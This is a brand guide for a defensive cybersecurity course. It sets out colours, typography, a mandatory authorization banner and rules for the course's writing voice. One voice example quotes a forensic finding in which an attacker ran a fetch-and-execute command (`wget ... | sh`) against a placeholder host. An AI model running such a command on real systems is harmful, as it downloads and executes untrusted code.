# C6 · Cybersecurity Crunch — Brand Guide

> **Voice:** sober, exacting, legally precise. The voice of an incident-response report, not a hacker movie.
> **Feel:** terminal-dark, with deliberate restraint.

Extends the family brand. C6-specific overrides only.

---

## Identity

- **Full name:** Cybersecurity Crunch
- **Program code:** C6
- **Full title in copy:** *C6 · Cybersecurity Crunch*
- **Tagline (short):** Defensive first. Offensive only with authorization.
- **Tagline (long):** A twelve-week free open-source defensive-and-authorized-offensive security track — from the Linux security model to a final CTF, entirely on machines you own or training platforms.
- **Canonical URL:** `codecrunchglobal.vercel.app/course-c6-cybersecurity`
- **License:** GPL-3.0

---

## Where C6 diverges from the family palette

C6 inherits Ink/Parchment/Gold but is one of two tracks (with C17) where the **inverted variant is the default for the marketing surface.** Parchment on Ink. Plus a single muted-red accent for the "alert / vulnerability / authorized scope" semantics:

| Role | Name | Hex | Use |
|------|------|-----|-----|
| Accent | Alert Red | `#EF4444` | Highlighting CVEs, the C6 mark, "unauthorized" warnings |
| Accent deep | Alert Red deep | `#B91C1C` | Hover states on dark surfaces |
| Accent soft | Alert Red soft | `#FCA5A5` | Subtle background tags for "high severity" |
| Surface | Crunch Slate | `#0F172A` | Default page background (inverted) |
| Surface alt | Crunch Slate 2 | `#1E293B` | Cards, code panels |

```css
:root {
  --alert-red:    #EF4444;
  --alert-deep:   #B91C1C;
  --alert-soft:   #FCA5A5;
  --slate:        #0F172A;
}
```

> **Red is rationed.** Use it only for security-meaningful signals: CVEs, severity badges, "do not test without authorization." A page that uses red for decoration is a page that desensitizes the reader to red — exactly the failure mode of bad security UI.

### Typography

EB Garamond display, Lora body — *but* JetBrains Mono is used heavily for any CVE identifier, port, IP address, hash, payload, or command. The mono face is the "this is technical truth" signal.

---

## Recurring page element — the authorization banner

Every page in the curriculum that describes an offensive technique opens with the authorization banner:

```
┌─────────────────────────────────────────────────────────────────────┐
│  AUTHORIZED USE ONLY                                                │
│                                                                     │
│  Practice the techniques in this module only on:                    │
│  - machines and networks you own                                    │
│  - legal training platforms (TryHackMe, HackTheBox, picoCTF,        │
│    VulnHub, OverTheWire, pwn.college)                               │
│  - systems with explicit written permission from the owner          │
│                                                                     │
│  Unauthorized testing is a crime. C6 does not teach crime.          │
└─────────────────────────────────────────────────────────────────────┘
```

Rules:

- Always JetBrains Mono.
- Always 1-px Alert-Red border.
- Always at the top of any "offensive" lecture, exercise, challenge, or mini-project.
- Not just on the README — *every page*. The redundancy is the point.

This banner is C6's most recognizable visual element — and the most important. It teaches the discipline before the technique.

---

## Voice rules (extending family)

- **Specificity over drama.** "Bash history reveals the attacker ran `wget evil.example/payload | sh` at 02:14 UTC" — not "the attacker did something nefarious."
- **Cite the CVE, the RFC, the advisory.** Always link to primary sources.
- **No glorification of unauthorized access.** Anonymous "elite hacker" stories are not in scope.
- **Always include the defender's view.** "Here's the attack — here's how the defender detects it — here's how the system is hardened."
- **Use "authorized testing" not "ethical hacking."** The latter is marketing speak.

---

## Course page conventions

The course page (`course-c6-cybersecurity.html`, future) uses the inverted variant — Slate background, Parchment text. The 12-week table is rendered as a "kill-chain ladder," each phase a stage. The authorization banner appears in the hero, not the footer.

---

*GPL-3.0. Fork freely.*
